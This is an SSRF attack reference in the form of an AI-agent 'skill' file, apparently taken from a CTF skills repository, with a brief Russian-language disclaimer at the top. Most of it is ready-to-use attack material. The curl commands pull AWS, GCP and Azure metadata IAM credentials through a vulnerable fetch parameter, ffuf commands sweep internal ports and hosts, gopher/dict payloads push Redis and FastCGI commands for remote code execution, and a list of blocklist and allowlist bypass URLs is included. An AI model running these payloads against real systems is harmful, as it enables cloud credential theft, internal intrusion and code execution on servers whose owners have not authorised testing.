# SSRF — Server-Side Request Forgery

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/ssrf.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/ssrf.md)

---

---
name: ssrf
category: web
triggers: [ssrf, "server side request forgery", "server-side request forgery", url, "fetch url", webhook, "image from url", "pdf generator", proxy, redirect, "169.254.169.254", metadata, gopher, "internal port scan", "blind ssrf", curl, "url=", "check url"]
tools: [burp, curl, ffuf, gopherus, interactsh, "burp collaborator"]
priority: high
description: Coerce the server into making attacker-controlled requests to internal/cloud targets for file read, metadata theft, port scan, and RCE.
---
# SSRF — Server-Side Request Forgery

## Trigger context
- Any parameter that takes a URL, hostname, IP, or file path the server fetches: `url=`, `next=`, `dest=`, `redirect=`, `uri=`, `path=`, `continue=`, `feed=`, `host=`, `port=`, `to=`, `out=`, `view=`, `image=`, `callback=`, `webhook=`.
- Features: link preview/unfurl, PDF/screenshot/thumbnail generators, webhooks, XML/SVG parsers (see [xxe](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--xxe.md)), file importers, RSS readers, "fetch avatar from URL", health-check/proxy endpoints.
- Signals: response contains fetched remote content, timing differences, or the app is cloud-hosted (AWS/GCP/Azure metadata reachable).

## Objective
Turn the outbound request into: (1) internal service access, (2) cloud metadata / IAM credential theft, (3) internal port/host scan, (4) protocol smuggling (gopher→Redis/MySQL/SMTP) for RCE, or (5) local file read via `file://`.

## Methodology (decision tree)
1. Confirm the fetch is server-side: point the param at your Collaborator/Interactsh host. DNS/HTTP hit = server-side fetch confirmed.
2. Try direct internal targets: `http://127.0.0.1/`, `http://localhost/`, `http://127.0.0.1:<port>/`. Compare response length/status vs. an external control.
3. Cloud metadata: hit `169.254.169.254` (see cloud table). Different cloud = different path/headers.
4. If direct internal IPs are blocked → go to Branching logic (filter bypass).
5. If no response body is reflected → **blind SSRF**: use Collaborator for OOB confirmation, then port-scan by timing/error differences.
6. Enumerate internal services by port-scanning `127.0.0.1` and `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`.
7. Escalate: `file://` for file read; `gopher://`/`dict://` to smuggle raw TCP to Redis/Memcached/MySQL/SMTP for RCE.

## Commands & payloads
```http
# 1. Confirm server-side fetch (OOB)
GET /fetch?url=http://YOUR-ID.oastify.com/ HTTP/1.1

# 2. Localhost / internal
url=http://127.0.0.1:80/
url=http://localhost/admin
url=http://127.0.0.1:6379/    # Redis
url=file:///etc/passwd
url=file:///proc/self/environ
```
```bash
# AWS IMDSv1 metadata + IAM creds (classic CTF win)
curl 'http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/'
curl 'http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
curl 'http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME'
# IMDSv2 needs a token first (server must forward the header — often blocks CTF; try v1)
# GCP (requires header Metadata-Flavor: Google — only works if app lets you set headers)
url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Azure
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01   # header Metadata:true
# Alibaba
url=http://100.100.100.200/latest/meta-data/
```
```bash
# Internal port scan with ffuf (diff by response size/time)
ffuf -w ports.txt -u 'http://TARGET/fetch?url=http://127.0.0.1:FUZZ/' -mc all -fs 0
# Host sweep across RFC1918 (find live internal hosts)
ffuf -w <(seq 1 254) -u 'http://TARGET/fetch?url=http://10.0.0.FUZZ/' -mc all -ac
# Gopher → Redis RCE via cron write (generate with gopherus)
gopherus --exploit redis
# example smuggled payload:
url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
# Gopher can also smuggle: MySQL, PostgreSQL, SMTP (send mail), FastCGI (php-fpm RCE), Zabbix
gopherus --exploit fastcgi     # /var/www/html/index.php -> php-fpm RCE
# dict:// to grab service banners / talk to single-line protocols
url=dict://127.0.0.1:6379/info
url=dict://127.0.0.1:11211/stats     # memcached
```
```
# High-value internal ports to probe:
22 ssh · 80/443/8080/8000 web-admin · 6379 redis · 11211 memcached
3306 mysql · 5432 postgres · 27017 mongo · 9200 elasticsearch · 5000 docker-registry
2375 docker-api (unauth RCE) · 8500 consul · 2379 etcd · 9000 php-fpm/fastcgi · 15672 rabbitmq
```

## Branching logic
- **Blocklist on `127.0.0.1`/`localhost`** → alt-IP notations:
  - Decimal: `http://2130706433/` · Hex: `http://0x7f000001/` · Octal: `http://0177.0.0.1/` · Short: `http://127.1/` · IPv6: `http://[::1]/`, `http://[::ffff:127.0.0.1]/`
  - Metadata as hex/decimal: `http://0xA9FEA9FE/`, `http://2852039166/`, `http://[::ffff:169.254.169.254]/`
- **Allowlist of a domain** → open-redirect chain: point to an allowed host that 30x-redirects internally; or `http://allowed.com@169.254.169.254/`, `http://169.254.169.254#allowed.com`, `http://169.254.169.254%00.allowed.com`.
- **DNS-based validation** → DNS rebinding (record TTL 0, flip A record between public IP at validate-time and `169.254.169.254` at fetch-time; use `rebind.network`/`nip.io`-style services) or a domain you control that resolves to the internal IP (`169.254.169.254.nip.io`).
- **Scheme filter (only http/https)** → try `file://`, `gopher://`, `dict://`, `ftp://`, `ldap://`, `sftp://`, `tftp://`; case/whitespace tricks `HtTp:`, `http:/\`.
- **Fragment/parser confusion** → `http://expected-host.com:80\@evil.com`, `http://127.0.0.1:80\/@allowed`.
- **No output reflected** → treat as blind: confirm via OOB, then infer internal state from timing and error deltas.

## Blind SSRF workflow
- No response body reflected: prove reachability with an out-of-band callback, then extract state indirectly.
- Confirm: submit `http://YOUR-ID.oastify.com` — a DNS lookup alone (no HTTP) still proves the parser resolved it.
- Enumerate internal hosts/ports by timing: open port → fast connect/refused; filtered → slow timeout; wrong host → instant DNS fail. Bucket the deltas.
- Escalate blind SSRF with gopher/dict fire-and-forget payloads (Redis `SET`/cron, FastCGI) even when you can't read the response — check the effect (flag written, callback from the command) instead.

## Common pitfalls
- Forgetting to set a control request — length/timing baselines are meaningless without one.
- IMDSv2 requires a PUT to get a token AND a custom header on GET; if the app can't set arbitrary headers, pivot to IMDSv1 or another cloud.
- Redirects may be followed by the fetch library but not by your validation — that's the bug, exploit it, don't assume it's patched.
- URL-encode gopher payloads exactly once too much/little and Redis rejects them; regenerate with gopherus.
- `file://` needs three slashes for absolute paths: `file:///etc/passwd`.

## Cloud metadata quick reference
```
AWS   http://169.254.169.254/latest/meta-data/            (IMDSv1, no header)
      .../latest/meta-data/iam/security-credentials/<role> -> AccessKeyId/SecretAccessKey/Token
      .../latest/user-data/                                 (bootstrap scripts, often secrets)
GCP   http://metadata.google.internal/computeMetadata/v1/  header: Metadata-Flavor: Google
      .../instance/service-accounts/default/token           -> OAuth token
Azure http://169.254.169.254/metadata/instance?api-version=2021-02-01   header: Metadata:true
      .../metadata/identity/oauth2/token?resource=https://management.azure.com/
DO    http://169.254.169.254/metadata/v1/                   (DigitalOcean)
K8s   https://kubernetes.default.svc/ + token at /var/run/secrets/kubernetes.io/...
```

## Proof / verification
- Metadata theft: paste the returned AWS `AccessKeyId`/`SecretAccessKey`/`Token`.
- Blind: screenshot the Collaborator/Interactsh DNS+HTTP interaction from the target IP.
- Port scan: table of open/closed ports by response-size delta.
- RCE: read the flag file the smuggled command wrote, or command output.

## Cross-references
[xxe](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--xxe.md) · [file-inclusion-lfi-rfi](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--file-inclusion-lfi-rfi.md) · [insecure-deserialization](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--insecure-deserialization.md) · [auth-jwt-session](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--auth-jwt-session.md) · [web-recon](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--web-recon.md)

## Credible sources
- https://portswigger.net/web-security/ssrf
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- https://github.com/tarunkant/Gopherus
- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
